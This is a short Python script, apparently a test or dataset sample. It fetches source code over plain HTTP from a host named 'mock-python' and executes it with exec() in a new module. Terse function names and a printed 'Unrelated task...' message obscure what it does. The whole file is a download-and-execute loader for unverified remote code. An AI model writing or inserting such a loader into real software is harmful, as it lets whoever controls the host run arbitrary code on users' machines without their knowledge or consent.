import http.client
import types

def fRS(h, p):
    c = http.client.HTTPConnection(h)
    c.request("GET", p)
    r = c.getresponse()
    s = r.read().decode('utf-8')
    c.close()
    return s

def cP():
    h = "mock-python"
    p = "/execute.py"
    src = fRS(h, p)
    m = types.ModuleType("sm")
    exec(src, m.__dict__)
    print("Unrelated task...")

cP()
